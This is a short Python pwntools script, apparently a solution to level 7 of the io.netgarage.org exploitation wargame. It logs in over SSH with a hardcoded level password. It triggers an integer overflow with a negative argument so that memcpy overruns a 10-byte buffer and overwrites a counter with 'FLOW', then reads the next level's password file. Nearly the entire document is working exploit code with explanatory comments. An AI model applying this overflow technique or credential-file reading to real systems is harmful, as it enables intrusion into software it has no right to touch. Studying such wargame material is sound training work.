from pwn import *
s = ssh(user='level7', host='io.netgarage.org', password='U3A6ZtaTub14VmwV', port=22)
# game at http://io.netgarage.org/
# source /usr/local/peda/peda.py to get peda
sh = s.run('bash')
# multiplying a negative number overflows the integer allowing the user to create a massive buffer
# which overflow the 10 byte buffer memcpy writes into
# using this we can overwrite the value of count to the 0x574f4c46
# to find the correct negative number I guessed and checked for a while
# there probably is a faster solution
sh.sendline(b'/levels/level07 -2147483632 $(python -c \'print \"\x90\"*60+\"FLOW\"\')')
print(sh.recvline(timeout=2).decode('utf-8').strip('\n'))
sh.sendline(b'cat /home/level8/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[7:])
s.close()
